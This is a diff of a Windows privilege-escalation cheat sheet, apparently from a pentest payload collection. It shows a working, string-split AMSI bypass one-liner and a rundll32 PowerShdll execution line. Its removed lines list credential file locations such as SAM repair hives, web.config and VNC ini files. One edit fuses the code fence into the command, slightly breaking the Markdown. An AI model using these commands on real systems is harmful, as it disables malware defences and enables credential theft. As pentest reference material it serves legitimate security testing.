@@ -235,8 +235,7 @@ ftp> rundll32.exe C:\temp\PowerShdll.dll,main
 
 Example of AMSI Bypass.
 
-```powershell
-PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
+```powershellPS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
 ```
 
 
@@ -356,45 +355,6 @@ Unattend credentials are stored in base64 and can be decoded manually with base6
 $ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 
 SecretSecurePassword1234*
 ```
-
-The Metasploit module `post/windows/gather/enum_unattend` looks for these files.
-
-### IIS Web config
-
-```powershell
-Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
-```
-
-```powershell
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
-C:\inetpub\wwwroot\web.config
-```
-
-### Other files
-
-```bat
-%SYSTEMDRIVE%\pagefile.sys
-%WINDIR%\debug\NetSetup.log
-%WINDIR%\repair\sam
-%WINDIR%\repair\system
-%WINDIR%\repair\software, %WINDIR%\repair\security
-%WINDIR%\iis6.log
-%WINDIR%\system32\config\AppEvent.Evt
-%WINDIR%\system32\config\SecEvent.Evt
-%WINDIR%\system32\config\default.sav
-%WINDIR%\system32\config\security.sav
-%WINDIR%\system32\config\software.sav
-%WINDIR%\system32\config\system.sav
-%WINDIR%\system32\CCM\logs\*.log
-%USERPROFILE%\ntuser.dat
-%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
-%WINDIR%\System32\drivers\etc\hosts
-C:\ProgramData\Configs\*
-C:\Program Files\Windows PowerShell\*
-dir c:*vnc.ini /s /b
-dir c:*ultravnc.ini /s /b
-```
-
 ### Wifi passwords
 
 Find AP SSID
